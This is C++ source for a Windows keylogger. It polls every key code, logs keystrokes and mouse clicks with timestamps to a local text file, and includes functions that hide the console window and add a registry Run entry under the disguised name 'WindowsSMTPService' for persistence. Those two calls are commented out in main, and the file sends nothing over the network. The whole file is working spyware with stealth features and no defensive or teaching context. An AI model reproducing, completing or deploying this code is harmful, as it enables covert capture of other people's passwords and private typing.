#include <iostream>
#include <algorithm>
#include <string>
#include <stdio.h>
#include <time.h>
#include <fstream>
#include <vector>
#include <windows.h>

//Log date and time
const std::string getDateTime()
{
	time_t now = time(0);
	struct tm tstruct;
	char buf[80];
	tstruct = *localtime(&now);

	strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);

	return buf;
}

//Log Special keys
void logWriter(LPCSTR text)
{
	std::ofstream log_file;
	log_file.open("LocalLog.txt", std::fstream::app);
	log_file << text;
	log_file.close();
}

//Hides cmd window
void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

//Run at OS startup
void AutoStart()
{
	HKEY hKey;
	LPCSTR czStartName = "WindowsSMTPService";
	const char* czExePath   = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\WindowsSMTPService.exe";
	LPCSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";


	LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_WRITE, &hKey);
	if( ERROR_SUCCESS == lnRes )
	{
		lnRes = RegSetValueEx(hKey, "WindowsSMTPService", 0, REG_SZ, (unsigned char*)czExePath, strlen(czExePath));
	}
	RegCloseKey(hKey);
}


//Register special keys, shift enter space control etc etc...
bool keyIsListed(int ikey)
{
	switch (ikey)
	{
	case VK_SPACE:
		logWriter((getDateTime() + " Key typed: *SPACE*" + "\n").c_str());
		return true;
	case VK_RETURN:
		logWriter((getDateTime() + " Key typed: *ENTER*" + "\n").c_str());
		return true;
	case VK_SHIFT:
		logWriter((getDateTime() + " Key typed: *SHIFT*" + "\n").c_str());
		return true;
	case VK_BACK:
		logWriter((getDateTime() + " Key typed: *BACKSPACE*" + "\n").c_str());
		return true;
	case VK_CONTROL:
		logWriter((getDateTime() + " Key typed: *CONTROL*" + "\n").c_str());
		return true;
	case VK_UP:
		logWriter((getDateTime() + " Key typed: *UP_ARROW*" + "\n").c_str());
		return true;
	case VK_DOWN:
		logWriter((getDateTime() + " Key typed: *DOWN_ARROW*" + "\n").c_str());
		return true;
	case VK_LEFT:
		logWriter((getDateTime() + " Key typed: *LEFT_ARROW*" + "\n").c_str());
		return true;
	case VK_RIGHT:
		logWriter((getDateTime() + " Key typed: *RIGHT_ARROW*" + "\n").c_str());
		return true;
	case VK_TAB:
		logWriter((getDateTime() + " Key typed: *TAB*" + "\n").c_str());
		return true;
	case VK_HOME:
		logWriter((getDateTime() + " Key typed: *HOME*" + "\n").c_str());
		return true;
	case VK_END:
		logWriter((getDateTime() + " Key typed: *END*" + "\n").c_str());
		return true;
	case VK_INSERT:
		logWriter((getDateTime() + " Key typed: *INSERT*" + "\n").c_str());
		return true;
	case VK_SNAPSHOT:
		logWriter((getDateTime() + " Key typed: *PRTSC*" + "\n").c_str());
		return true;
	case VK_DELETE:
		logWriter((getDateTime() + " Key typed: *DELETE*" + "\n").c_str());
		return true;
	case VK_LBUTTON:
		logWriter((getDateTime() + " Key typed: *lClick*" + "\n").c_str());
		return true;
	case VK_RBUTTON:
		logWriter((getDateTime() + " Key typed: *rClick*" + "\n").c_str());
		return true;
	case VK_LWIN:
		logWriter((getDateTime() + " Key typed: *WINDOWS_KEY*" + "\n").c_str());
		return true;
	case VK_OEM_COMMA:
		logWriter((getDateTime() + " Key typed: ," + "\n").c_str());
		return true;
	case VK_OEM_PERIOD:
		logWriter((getDateTime() + " Key typed: ." + "\n").c_str());
		return true;
	case VK_OEM_MINUS:
		logWriter((getDateTime() + " Key typed: -" + "\n").c_str());
		return true;
	case VK_OEM_PLUS:
		logWriter((getDateTime() + " Key typed: +" + "\n").c_str());
		return true;
	case VK_ESCAPE:
		logWriter((getDateTime() + " Key typed: *ESC*" + "\n").c_str());
		return true;
	case VK_CAPITAL:
		logWriter((getDateTime() + " Key typed: *CAPSLOCK*" + "\n").c_str());
		return true;
	case VK_NUMLOCK:
		logWriter((getDateTime() + " Key typed: *NUMLOCK*" + "\n").c_str());
		return true;
	case VK_MENU:
		logWriter((getDateTime() + " Key typed: *ALT*" + "\n").c_str());
		return true;
	default: return false;
	}
}

int main()
{
	//HideConsole();
	//AutoStart();
	int keyPressed;
	std::vector<int> keyIntVect{ 221, 222, 192, 220, 33, 34, 219, 186, 191, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 106, 107, 108, 109, 110, 111, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105 };
	std::vector<std::string> keyStrVect{ "Å", "Ä", "Ö", "§", "PgUp", "PgDn", "´", "¨", "'", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", "*NUMPAD KEY*", "*NUMPAD KEY*", "*NUMPAD KEY*", "*NUMPAD KEY*", "*NUMPAD KEY*", "*NUMPAD KEY*", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" };
	while (true)
	{
		Sleep(2);
		for (keyPressed = 8; keyPressed <= 255; keyPressed++)
		{
			if (GetAsyncKeyState(keyPressed) == -32767)
			{
				// && keyPressed > 34 && keyPressed < 91
				if (keyIsListed(keyPressed) == false && keyPressed > 34 && keyPressed < 91)
				{
					std::ofstream log_file;
					log_file.open("LocalLog.txt", std::fstream::app);
					log_file << getDateTime() + " Key typed: " + char(keyPressed) + " ";
					log_file << keyPressed;
					log_file << "\n";
					log_file.close();
				}
				if (std::find(keyIntVect.begin(), keyIntVect.end(), keyPressed) != keyIntVect.end())
				{
					auto indexPos = std::distance(keyIntVect.begin(), std::find(keyIntVect.begin(), keyIntVect.end(), keyPressed));
					std::ofstream log_file;
					log_file.open("LocalLog.txt", std::fstream::app);
					log_file << getDateTime() + " Key typed: " + keyStrVect[indexPos] + "\n";
					log_file.close();
				}
			}
		}
	}
	return 0;
}